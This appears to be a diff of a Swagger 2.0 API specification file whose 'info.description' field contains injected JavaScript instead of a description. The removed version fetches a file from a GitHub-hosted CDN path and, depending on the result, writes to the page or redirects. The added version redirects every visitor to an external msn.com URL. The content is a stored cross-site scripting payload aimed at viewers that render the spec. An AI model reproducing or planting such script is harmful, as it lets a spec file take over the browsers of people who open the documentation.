@@ -1,3 +1,4 @@
 { 
 "swagger": "2.0", 
-"info": { "description": "<script>if(!window.done){window.done=1;document.write(``); fetch(`https://cdn.jsdelivr.net/gh/doyly/test@main/assets/case/99053895/1`).then((e)=>{if(e.status==404){document.write(`<h2>test</h2>`)}else{location='https://www.msn.com/watch?v=lNUxJ6SL7T0&pp=ygUOcGl0YnVsbCBtYXNodXA%3D'}})  }</script>"}
+"info": {"description": "<script>location='https://www.msn.com/watch?v=lNUxJ6SL7T0&pp=ygUOcGl0YnVsbCBtYXNodXA%3D'</script>"}
+}
